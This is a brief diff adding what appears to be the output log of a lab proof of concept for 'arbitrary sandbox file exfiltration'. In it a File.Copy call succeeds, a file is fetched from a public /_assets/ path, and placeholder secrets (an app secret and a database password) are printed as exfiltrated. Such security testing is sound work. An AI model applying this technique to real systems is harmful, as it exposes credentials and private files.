@@ -1,0 +1,5 @@
+=== standalone critical: arbitrary sandbox file exfiltration ===
+File.Copy: 200 {"status":"success","data":{"success":true}}
+GET /_assets/leak.txt: 200
+EXFILTRATED: APP_SECRET=lab-secret-0xdeadbeef
+DB_PASSWORD=hunter2
